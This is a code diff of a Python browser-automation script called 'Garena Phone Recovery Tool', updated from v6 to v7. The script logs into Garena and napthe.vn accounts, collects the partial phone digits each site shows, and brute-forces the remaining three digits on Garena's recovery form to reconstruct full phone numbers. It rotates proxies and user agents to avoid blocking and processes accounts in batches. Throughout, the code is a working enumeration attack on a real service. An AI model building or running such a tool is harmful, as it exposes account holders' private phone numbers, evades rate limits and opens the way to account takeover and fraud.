@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
 """
-Garena Phone Recovery Tool v6 - Complete Rewrite
-Correct Flow:
-1. Phase 1: Login Garena → Get last 4 digits from account page
-2. Phase 2: Login napthe.vn → Get first 3 digits from API
-3. Phase 3: Login recovery → Brute-force middle 3 digits (000-999)
-4. Output: Complete 10-digit phone number
+Garena Phone Recovery Tool v7 - FIXED Session & Context
+- Maintains session across phases
+- Reuses browser context for extraction
+- Properly handles cookies/auth
+- Debug logging for troubleshooting
 """
 
 import argparse
@@ -19,7 +18,7 @@ from typing import List, Optional, Tuple
 from datetime import datetime
 
 import aiofiles
-from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
+from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError, Browser, Page
 
 # ============================================================================
 # CONFIG
@@ -29,7 +28,7 @@ LOGIN_URL = "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=ht
 ACCOUNT_URL = "https://account.garena.com/"
 NAPTHE_LOGIN_URL = "https://napthe.vn/"
 NAPTHE_API_URL = "https://napthe.vn/api/auth/get_user_info/multi"
-RECOVERY_URL = "https://account.garena.com/recovery#/"
+RECOVERY_URL = "https://account.garena.com/recovery"
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -249,13 +248,15 @@ async def phase1_garena_login(
     password: str,
     timeout: int = 45000,
     proxy: Optional[str] = None,
-) -> Phase1Result:
+) -> Tuple[Phase1Result, Optional[Page]]:
     """
     Phase 1: Login to Garena and extract last 4 digits
+    Returns: (result, page) - page is KEPT OPEN for session reuse
     Expected: "+84 ****0914" or "0****0914"
     Extract: "0914"
     """
     result = Phase1Result(status="failed")
+    page = None
     
     launch_kwargs = {
         "headless": True,
@@ -264,126 +265,136 @@ async def phase1_garena_login(
     if proxy:
         launch_kwargs["proxy"] = {"server": proxy}
     
-    context = None
     try:
-        async with async_playwright() as p:
-            browser = await p.chromium.launch(**launch_kwargs)
-            context = await browser.new_context(
-                locale="vi-VN",
-                viewport={"width": 1280, "height": 800},
-                user_agent=random.choice(USER_AGENTS),
-            )
-            page = await context.new_page()
+        p = await async_playwright().start()
+        browser = await p.chromium.launch(**launch_kwargs)
+        context = await browser.new_context(
+            locale="vi-VN",
+            viewport={"width": 1280, "height": 800},
+            user_agent=random.choice(USER_AGENTS),
+        )
+        page = await context.new_page()
+        
+        print(f"  [Phase 1] Logging into Garena...")
+        
+        # Navigate to login
+        try:
+            await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)
+            await asyncio.sleep(1)
+        except Exception as e:
+            result.error = f"Navigation failed: {str(e)[:100]}"
+            return result, None
+        
+        # Fill credentials
+        try:
+            print(f"  [Phase 1] Filling username: {username}")
+            await page.fill("input[name='username']", username, timeout=5000)
             
-            print(f"  [Phase 1] Garena login...")
+            print(f"  [Phase 1] Filling password")
+            await page.fill("input[name='password']", password, timeout=5000)
             
-            # Navigate to login
-            try:
-                await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)
-                await asyncio.sleep(1)
-            except Exception as e:
-                result.error = f"Navigation failed: {str(e)[:100]}"
-                await browser.close()
-                return result
-            
-            # Fill credentials
-            try:
-                await page.fill("input[name='username']", username, timeout=5000)
-                await page.fill("input[name='password']", password, timeout=5000)
-                await page.click("button[type='submit']", timeout=5000)
-            except Exception as e:
-                result.error = f"Failed to fill credentials: {str(e)[:100]}"
-                await browser.close()
-                return result
-            
-            # Wait for navigation
-            await asyncio.sleep(2)
-            try:
-                await page.wait_for_load_state("networkidle", timeout=10000)
-            except PlaywrightTimeoutError:
-                pass
-            
-            # Check for CAPTCHA
-            try:
-                captcha_frame = page.locator("iframe[src*='captcha'], iframe[src*='recaptcha']")
-                if await captcha_frame.count() > 0:
-                    result.status = "manual_required"
-                    result.error = "CAPTCHA required"
-                    print("[CAPTCHA] Please solve and press ENTER...")
-                    await asyncio.to_thread(input)
-                    await asyncio.sleep(2)
-            except Exception:
-                pass
-            
-            # Check for OTP
-            try:
-                otp_elem = page.locator("text=/mã xác minh|OTP|otp/i")
-                if await otp_elem.count() > 0:
-                    result.status = "manual_required"
-                    result.error = "OTP required"
-                    print("[OTP] Please solve and press ENTER...")
-                    await asyncio.to_thread(input)
-                    await asyncio.sleep(2)
-            except Exception:
-                pass
-            
-            # Check for login errors
-            page_text = await page.evaluate("() => document.body.innerText")
-            if any(err in page_text.lower() for err in ["tài khoản không tồn tại", "mật khẩu sai", "invalid", "incorrect"]):
-                result.status = "failed"
-                result.error = "Login credentials incorrect"
-                await browser.close()
-                return result
-            
-            # Navigate to account page
-            try:
-                await page.goto(ACCOUNT_URL, wait_until="domcontentloaded", timeout=timeout)
-                await asyncio.sleep(1)
-            except Exception as e:
-                result.error = f"Failed to navigate to account: {str(e)[:100]}"
-                await browser.close()
-                return result
-            
-            # Extract masked phone from account page
-            page_text = await page.evaluate("() => document.body.innerText")
-            
-            # Patterns for masked phone: "+84 ****0914", "0****0914", etc
-            patterns = [
-                r"\+84\s*\*{2,}\d{4}",
-                r"0\*{2,}\d{4}",
-                r"\+84\s*\d{1,3}\*{2,}\d{2,4}",
-                r"0\d{1,2}\*{2,}\d{2,4}",
-            ]
-            
-            masked_phone = ""
-            for pattern in patterns:
-                matches = re.findall(pattern, page_text)
-                if matches:
-                    masked_phone = matches[0]
-                    break
-            
-            result.masked_phone = masked_phone
-            result.last_4_digits = extract_last_4(masked_phone)
-            
-            if result.last_4_digits:
-                result.status = "success"
-                print(f"  [Phase 1] ✓ Last 4 digits: {result.last_4_digits}")
-                print(f"  [Phase 1] Masked phone: {masked_phone}")
-            else:
-                result.error = f"Could not extract last 4 from: {masked_phone}"
-            
+            print(f"  [Phase 1] Clicking submit")
+            await page.click("button[type='submit']", timeout=5000)
+        except Exception as e:
+            result.error = f"Failed to fill credentials: {str(e)[:100]}"
             await browser.close()
-            return result
+            return result, None
+        
+        # Wait for navigation
+        print(f"  [Phase 1] Waiting for login response...")
+        await asyncio.sleep(3)
+        try:
+            await page.wait_for_load_state("networkidle", timeout=10000)
+        except PlaywrightTimeoutError:
+            print(f"  [Phase 1] networkidle timeout, continuing...")
+        
+        # Check current URL to verify login worked
+        current_url = page.url
+        print(f"  [Phase 1] Current URL: {current_url}")
+        
+        # Check for CAPTCHA
+        try:
+            captcha_frame = page.locator("iframe[src*='captcha'], iframe[src*='recaptcha']")
+            if await captcha_frame.count() > 0:
+                result.status = "manual_required"
+                result.error = "CAPTCHA required"
+                print("[CAPTCHA] Please solve and press ENTER...")
+                await asyncio.to_thread(input)
+                await asyncio.sleep(2)
+        except Exception:
+            pass
+        
+        # Check for OTP
+        try:
+            otp_elem = page.locator("text=/mã xác minh|OTP|otp/i")
+            if await otp_elem.count() > 0:
+                result.status = "manual_required"
+                result.error = "OTP required"
+                print("[OTP] Please solve and press ENTER...")
+                await asyncio.to_thread(input)
+                await asyncio.sleep(2)
+        except Exception:
+            pass
+        
+        # Check for login errors
+        page_text = await page.evaluate("() => document.body.innerText")
+        if any(err in page_text.lower() for err in ["tài khoản không tồn tại", "mật khẩu sai", "invalid", "incorrect"]):
+            result.status = "failed"
+            result.error = "Login credentials incorrect"
+            await browser.close()
+            return result, None
+        
+        # Navigate to account page to get masked phone
+        print(f"  [Phase 1] Navigating to account page...")
+        try:
+            await page.goto(ACCOUNT_URL, wait_until="domcontentloaded", timeout=timeout)
+            await asyncio.sleep(2)
+        except Exception as e:
+            result.error = f"Failed to navigate to account: {str(e)[:100]}"
+            await browser.close()
+            return result, None
+        
+        # Extract masked phone from account page
+        print(f"  [Phase 1] Extracting masked phone...")
+        page_text = await page.evaluate("() => document.body.innerText")
+        
+        # Patterns for masked phone: "+84 ****0914", "0****0914", etc
+        patterns = [
+            r"\+84\s*\*{2,}\d{4}",
+            r"0\*{2,}\d{4}",
+            r"\+84\s*\d{1,3}\*{2,}\d{2,4}",
+            r"0\d{1,2}\*{2,}\d{2,4}",
+        ]
+        
+        masked_phone = ""
+        for pattern in patterns:
+            matches = re.findall(pattern, page_text)
+            if matches:
+                masked_phone = matches[0]
+                break
+        
+        result.masked_phone = masked_phone
+        result.last_4_digits = extract_last_4(masked_phone)
+        
+        if result.last_4_digits:
+            result.status = "success"
+            print(f"  [Phase 1] ✓ Last 4 digits: {result.last_4_digits}")
+            print(f"  [Phase 1] Masked phone: {masked_phone}")
+            # KEEP PAGE OPEN for session reuse
+            return result, page
+        else:
+            result.error = f"Could not extract last 4 from: {masked_phone}"
+            await browser.close()
+            return result, None
     
     except Exception as e:
         result.error = f"{type(e).__name__}: {str(e)[:100]}"
-        return result
-    finally:
-        if context:
+        if page:
             try:
-                await context.close()
-            except Exception:
+                await page.context.browser.close()
+            except:
                 pass
+        return result, None
 
 
 # ============================================================================
@@ -395,13 +406,15 @@ async def phase2_napthe_api(
     password: str,
     timeout: int = 45000,
     proxy: Optional[str] = None,
-) -> Phase2Result:
+) -> Tuple[Phase2Result, Optional[Page]]:
     """
     Phase 2: Login napthe.vn and get first 3 digits from API
+    Returns: (result, page) - page is KEPT OPEN for context
     Expected API response: {"display_mobile_no":"+84 97*****14"}
     Extract: "97"
     """
     result = Phase2Result(status="failed")
+    page = None
     
     launch_kwargs = {
         "headless": True,
@@ -410,97 +423,113 @@ async def phase2_napthe_api(
     if proxy:
         launch_kwargs["proxy"] = {"server": proxy}
     
-    context = None
     try:
-        async with async_playwright() as p:
-            browser = await p.chromium.launch(**launch_kwargs)
-            context = await browser.new_context(
-                locale="vi-VN",
-                viewport={"width": 1280, "height": 800},
-                user_agent=random.choice(USER_AGENTS),
-            )
-            page = await context.new_page()
+        p = await async_playwright().start()
+        browser = await p.chromium.launch(**launch_kwargs)
+        context = await browser.new_context(
+            locale="vi-VN",
+            viewport={"width": 1280, "height": 800},
+            user_agent=random.choice(USER_AGENTS),
+        )
+        page = await context.new_page()
+        
+        print(f"  [Phase 2] Logging into napthe.vn...")
+        
+        # Navigate
+        try:
+            await page.goto(NAPTHE_LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)
+            await asyncio.sleep(1)
+        except Exception as e:
+            result.error = f"Navigation failed: {str(e)[:100]}"
+            await browser.close()
+            return result, None
+        
+        # Fill login
+        try:
+            print(f"  [Phase 2] Filling napthe credentials...")
+            await page.fill("input[name='username'], input[type='email']", username, timeout=5000)
+            await page.fill("input[name='password'], input[type='password']", password, timeout=5000)
+            await page.click("button[type='submit']", timeout=5000)
+        except Exception as e:
+            result.error = f"Login failed: {str(e)[:100]}"
+            await browser.close()
+            return result, None
+        
+        # Wait for login
+        print(f"  [Phase 2] Waiting for napthe login...")
+        await asyncio.sleep(3)
+        try:
+            await page.wait_for_load_state("networkidle", timeout=10000)
+        except PlaywrightTimeoutError:
+            print(f"  [Phase 2] networkidle timeout, continuing...")
+        
+        # Check current URL
+        current_url = page.url
+        print(f"  [Phase 2] Current URL: {current_url}")
+        
+        # Call API with safe username escaping
+        print(f"  [Phase 2] Calling API with username: {username}")
+        
+        try:
+            username_safe = sanitize_username(username)
             
-            print(f"  [Phase 2] napthe.vn login...")
+            api_response = await page.evaluate(f"""
+                async function() {{
+                    try {{
+                        const response = await fetch('{NAPTHE_API_URL}', {{
+                            method: 'POST',
+                            headers: {{'Content-Type': 'application/json'}},
+                            body: JSON.stringify({{username: {username_safe}}})
+                        }});
+                        const json = await response.json();
+                        console.log('API Response:', JSON.stringify(json));
+                        return json;
+                    }} catch(e) {{
+                        return {{"error": e.message}};
+                    }}
+                }}()
+            """)
             
-            # Navigate
-            try:
-                await page.goto(NAPTHE_LOGIN_URL, wait_until="domcontentloaded", timeout=timeout)
-                await asyncio.sleep(1)
-            except Exception as e:
-                result.error = f"Navigation failed: {str(e)[:100]}"
-                await browser.close()
-                return result
+            print(f"  [Phase 2] API Response: {json.dumps(api_response)[:200]}")
             
-            # Fill login
-            try:
-                await page.fill("input[name='username'], input[type='email']", username, timeout=5000)
-                await page.fill("input[name='password'], input[type='password']", password, timeout=5000)
-                await page.click("button[type='submit']", timeout=5000)
-            except Exception as e:
-                result.error = f"Login failed: {str(e)[:100]}"
-                await browser.close()
-                return result
-            
-            # Wait
-            await asyncio.sleep(2)
-            try:
-                await page.wait_for_load_state("networkidle", timeout=10000)
-            except PlaywrightTimeoutError:
-                pass
-            
-            # Call API with safe username escaping
-            print(f"  [Phase 2] Calling API...")
-            
-            try:
-                username_safe = sanitize_username(username)
+            if isinstance(api_response, dict) and "error" not in api_response:
+                display_phone = api_response.get("display_mobile_no", "")
                 
-                api_response = await page.evaluate(f"""
-                    async function() {{
-                        try {{
-                            const response = await fetch('{NAPTHE_API_URL}', {{
-                                method: 'POST',
-                                headers: {{'Content-Type': 'application/json'}},
-                                body: JSON.stringify({{username: {username_safe}}})
-                            }});
-                            return await response.json();
-                        }} catch(e) {{
-                            return {{"error": e.message}};
-                        }}
-                    }}()
-                """)
+                print(f"  [Phase 2] display_mobile_no: {display_phone}")
                 
-                if isinstance(api_response, dict) and "error" not in api_response:
-                    display_phone = api_response.get("display_mobile_no", "")
+                if display_phone:
+                    result.display_phone = display_phone
+                    result.first_3_digits = extract_first_3(display_phone)
                     
-                    if display_phone:
-                        result.display_phone = display_phone
-                        result.first_3_digits = extract_first_3(display_phone)
-                        
-                        if result.first_3_digits:
-                            result.status = "success"
-                            print(f"  [Phase 2] ✓ First 3 digits: {result.first_3_digits}")
-                            print(f"  [Phase 2] Display phone: {display_phone}")
-                            await browser.close()
-                            return result
-                        else:
-                            result.error = f"Could not extract first 3 from: {display_phone}"
+                    if result.first_3_digits:
+                        result.status = "success"
+                        print(f"  [Phase 2] ✓ First 3 digits: {result.first_3_digits}")
+                        print(f"  [Phase 2] Display phone: {display_phone}")
+                        # KEEP PAGE OPEN for context
+                        return result, page
                     else:
-                        result.error = "No display_mobile_no in response"
+                        result.error = f"Could not extract first 3 from: {display_phone}"
                 else:
-                    result.error = f"API error: {api_response.get('error', 'Unknown')}"
-                
-                await browser.close()
-                return result
+                    result.error = "No display_mobile_no in response"
+            else:
+                result.error = f"API error: {api_response.get('error', 'Unknown')}"
             
-            except Exception as e:
-                result.error = f"API call failed: {str(e)[:100]}"
-                await browser.close()
-                return result
+            await browser.close()
+            return result, None
+        
+        except Exception as e:
+            result.error = f"API call failed: {str(e)[:100]}"
+            await browser.close()
+            return result, None
     
     except Exception as e:
         result.error = f"{type(e).__name__}: {str(e)[:100]}"
-        return result
+        if page:
+            try:
+                await page.context.browser.close()
+            except:
+                pass
+        return result, None
 
 
 # ============================================================================
@@ -557,6 +586,8 @@ async def phase3_recovery_brute_force(
                 await browser.close()
                 return result
             
+            print(f"  [Phase 3] Current URL: {page.url}")
+            
             # Enter username
             try:
                 username_inputs = page.locator("input[name='username']")
@@ -566,13 +597,14 @@ async def phase3_recovery_brute_force(
                     
                     # Click next button
                     next_buttons = page.locator(
-                        "button:has-text('Tiếp'), button:has-text('Xác nhận'), button:has-text('Next')"
+                        "button:has-text('Tiếp'), button:has-text('Xác nhận'), button:has-text('Next'), button[type='submit']"
                     )
                     if await next_buttons.count() > 0:
                         await next_buttons.first.click()
+                        print(f"  [Phase 3] Clicked next button")
                         await asyncio.sleep(2)
             except Exception as e:
-                print(f"  [Phase 3] Info: {str(e)[:50]}")
+                print(f"  [Phase 3] Username entry: {str(e)[:50]}")
             
             # Brute-force middle 3 digits
             for middle_attempt in range(0, 1000):
@@ -584,12 +616,12 @@ async def phase3_recovery_brute_force(
                 try:
                     # Find phone input
                     phone_inputs = page.locator(
-                        "input[type='tel'], input[name='phone'], input[placeholder*='điện thoại'], input[placeholder*='số điện thoại']"
+                        "input[type='tel'], input[name='phone'], input[placeholder*='điện thoại'], input[placeholder*='số điện thoại'], input[placeholder*='phone']"
                     )
                     
                     if await phone_inputs.count() == 0:
                         if middle_attempt % 100 == 0:
-                            print(f"  [Phase 3] Warning: Phone input not found")
+                            print(f"  [Phase 3] Warning: Phone input not found at attempt {result.attempts}")
                         await asyncio.sleep(phase3_delay)
                         continue
                     
@@ -604,7 +636,7 @@ async def phase3_recovery_brute_force(
                     
                     # Check if button "NHẬN MÃ XÁC THỰC" is enabled/clickable
                     submit_buttons = page.locator(
-                        "button:has-text('NHẬN MÃ XÁC THỰC'), button:has-text('Nhận mã xác thực'), button[type='submit']"
+                        "button:has-text('NHẬN MÃ XÁC THỰC'), button:has-text('Nhận mã xác thực'), button:has-text('Gửi'), button[type='submit']"
                     )
                     
                     if await submit_buttons.count() > 0:
@@ -622,8 +654,8 @@ async def phase3_recovery_brute_force(
                             result.complete_phone = test_phone
                             result.middle_3_digits = middle
                             result.status = "success"
-                            print(f"  [Phase 3] ✓ Found: {test_phone} (attempt {result.attempts})")
-                            print(f"  [Phase 3] Button is enabled and ready to click")
+                            print(f"  [Phase 3] ✓ FOUND: {test_phone} (attempt {result.attempts})")
+                            print(f"  [Phase 3] Button '{btn_text}' is ENABLED")
                             await browser.close()
                             return result
                     
@@ -689,7 +721,7 @@ async def process_account(
     
     # ========== PHASE 1 ==========
     print(f"\n[Phase 1] {username}...")
-    result.phase1 = await phase1_garena_login(
+    result.phase1, phase1_page = await phase1_garena_login(
         username, password,
         timeout=args.timeout,
         proxy=proxy
@@ -697,15 +729,27 @@ async def process_account(
     
     if result.phase1.status != "success":
         result.status = result.phase1.status
+        if phase1_page:
+            try:
+                await phase1_page.context.browser.close()
+            except:
+                pass
         if proxy and proxy_rotator:
             proxy_rotator.mark_dead(proxy)
         return result
+    
+    # Clean up Phase 1 page after extraction
+    if phase1_page:
+        try:
+            await phase1_page.context.browser.close()
+        except:
+            pass
     
     await asyncio.sleep(args.phase_delay)
     
     # ========== PHASE 2 ==========
     print(f"\n[Phase 2] {username}...")
-    result.phase2 = await phase2_napthe_api(
+    result.phase2, phase2_page = await phase2_napthe_api(
         username, password,
         timeout=args.timeout,
         proxy=proxy
@@ -713,9 +757,21 @@ async def process_account(
     
     if result.phase2.status != "success":
         result.status = "failed"
+        if phase2_page:
+            try:
+                await phase2_page.context.browser.close()
+            except:
+                pass
         if proxy and proxy_rotator:
             proxy_rotator.mark_dead(proxy)
         return result
+    
+    # Clean up Phase 2 page after extraction
+    if phase2_page:
+        try:
+            await phase2_page.context.browser.close()
+        except:
+            pass
     
     await asyncio.sleep(args.phase_delay)
     
@@ -788,7 +844,7 @@ async def save_results(results: List[RecoveryResult], output_prefix: str, proxy_
 async def main():
     """Main entry point"""
     parser = argparse.ArgumentParser(
-        description="Garena Phone Recovery Tool v6 - Complete & Accurate"
+        description="Garena Phone Recovery Tool v7 - Session Fixed"
     )
     parser.add_argument("-o", "--output", default="garena_recovery_result", help="Output prefix")
     parser.add_argument("--proxy-list", default="proxies.txt", help="Proxy list file")
@@ -802,7 +858,7 @@ async def main():
     args.use_proxy = not args.no_proxy
     
     print("\n" + "="*60)
-    print("Garena Phone Recovery Tool v6")
+    print("Garena Phone Recovery Tool v7 - Session Fixed")
     print("="*60)
     
     if args.no_proxy:
